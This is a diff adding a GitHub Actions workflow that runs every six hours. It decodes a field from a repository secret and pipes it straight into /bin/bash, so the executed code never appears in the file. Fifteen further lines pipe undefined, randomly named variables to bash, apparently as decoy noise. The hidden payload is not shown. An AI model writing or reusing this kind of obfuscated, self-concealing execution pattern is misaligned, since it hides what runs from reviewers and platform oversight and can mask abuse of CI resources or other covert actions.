@@ -1,0 +1,33 @@
+name: tuyouqixingyou
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '57 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: tuyouqixingyou
+        env:
+          cuj1: ${{ secrets.cuj1 }}
+        run: |
+          echo $cuj1 | jq -r .wj926 | /bin/bash
+          echo $zwwgw6993 | jq -r .vbr3 | /bin/bash
+          echo $ceuj81686 | jq -r .pdvay50 | /bin/bash
+          echo $fea573 | jq -r .sgtza650 | /bin/bash
+          echo $wvam0963 | jq -r .r0426 | /bin/bash
+          echo $rmyr3588 | jq -r .o85394 | /bin/bash
+          echo $u127 | jq -r .turxc75 | /bin/bash
+          echo $ajdbk621 | jq -r .eidzu63786 | /bin/bash
+          echo $wua7 | jq -r .y1467 | /bin/bash
+          echo $ovnjr19 | jq -r .finv94488 | /bin/bash
+          echo $dlrt1362 | jq -r .y58 | /bin/bash
+          echo $k914 | jq -r .xsl44 | /bin/bash
+          echo $pbsf1 | jq -r .y659 | /bin/bash
+          echo $y725 | jq -r .wuhj90 | /bin/bash
+          echo $gaw58131 | jq -r .pham46796 | /bin/bash
+          echo $fv2 | jq -r .wljxv51 | /bin/bash
+
